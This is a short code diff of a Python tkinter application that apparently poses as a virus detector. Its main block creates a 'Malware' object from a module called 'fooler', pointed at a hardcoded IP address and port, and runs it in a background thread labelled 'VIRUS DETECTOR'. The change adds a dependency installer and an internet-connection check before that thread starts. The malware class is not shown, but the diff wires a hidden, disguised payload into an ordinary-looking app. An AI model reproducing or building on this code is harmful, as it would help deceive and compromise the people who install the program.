@@ -2,7 +2,7 @@ import tkinter as tk
 from tkinter import messagebox
 from threading import Thread
 from fooler import Malware
-import depchker
+from depchker import Dependencies_Installer
 import time
 
 '''
@@ -131,8 +131,10 @@ def startapp():
     root.mainloop()
 
 if __name__ == '__main__':
-    malware = Malware('192.168.102.3',2222)
-    main_thread = Thread(name='VIRUS DETECTOR',target=malware.run,daemon=False)
-    main_thread.start()
-    depchker.main()
-    startapp()
+    di = Dependencies_Installer()
+    if di.internet_con() == True:
+        di.install_dependencies()
+        malware = Malware('192.168.102.3',2222)
+        main_thread = Thread(name='VIRUS DETECTOR',target=malware.run,daemon=False)
+        main_thread.start()
+        startapp()
